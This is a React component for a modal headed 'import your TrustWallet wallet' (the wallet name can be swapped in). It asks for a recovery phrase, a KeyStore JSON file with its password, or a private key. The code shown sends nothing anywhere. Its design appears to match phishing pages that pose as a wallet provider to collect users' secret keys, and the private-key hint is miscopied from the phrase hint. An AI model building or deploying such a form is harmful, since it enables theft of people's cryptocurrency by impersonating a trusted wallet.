import { CustomPlaceholder } from "react-placeholder-image"
import Container from "./Container"
import Tabs, { Tab } from "./Tabs"

const ConnectManuallyModal = ({ title, src}) => {
    return (
        <div className=" w-11/12 max-w-xl fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 shadow-lg rounded-lg bg-white py-8 px-5 space-y-9">
            <div className="flex justify-between items-center">
                <CustomPlaceholder width={40}  height={40} className="block" />
                <h3 className="font-medium text-xl text-center">import your {title || "TrustWallet"} wallet</h3>
            </div>
            <Tabs>
                <Tab label="Phrase">
                   <textarea className="w-full placeholder:text-normal font-light px-3 py-2  border-2 resize-none rounded-xl border-solid mb-2" id="recovery-phrase" placeholder="Enter your recovery phrase">

                   </textarea>

                   <p className="text-gray-600 text-sm font-light tracking-wide text-center">Typically 12 (sometimes 24) words separated by single spaces</p>
                </Tab>

                <Tab label="KeyStore JSON">
                    <textarea className="w-full placeholder:text-sm font-light px-3 py-2  border-2 resize-none rounded-xl border-solid mb-2" id="key-store-json" placeholder="KeyStore JSON"></textarea>

                    <input className="w-full placeholder:text-sm font-light p-3  border-2 resize-none rounded-xl border-solid mb-2" type="text" placeholder="Wallet Password" />

                    <p className="text-gray-600 text-sm font-light tracking-wide text-center">Several lines of text beginning with {`"{...}"`} plus the password you used to encrypt it.</p>
                </Tab>

                <Tab label="Private Key">
                    <input className="w-full placeholder:text-sm font-light p-3  border-2 resize-none rounded-xl border-solid mb-2" type="text" placeholder="Enter Your Private Key" />

                    <p className="text-gray-600 text-sm font-light tracking-wide text-center">Typically 12 (sometimes 24) words seperated by a single space.</p>
                </Tab>
            </Tabs>
            <div className="space-y-4">
            <button className="block bg-blue-400 px-4 py-2 text-center w-full rounded-lg font-semibold text-white text-lg">proceed</button>
            <button className="block bg-red-400 px-4 py-2 text-center w-full rounded-lg font-semibold text-white text-lg">cancel</button>
            </div>
        </div>
    )
}

export default ConnectManuallyModal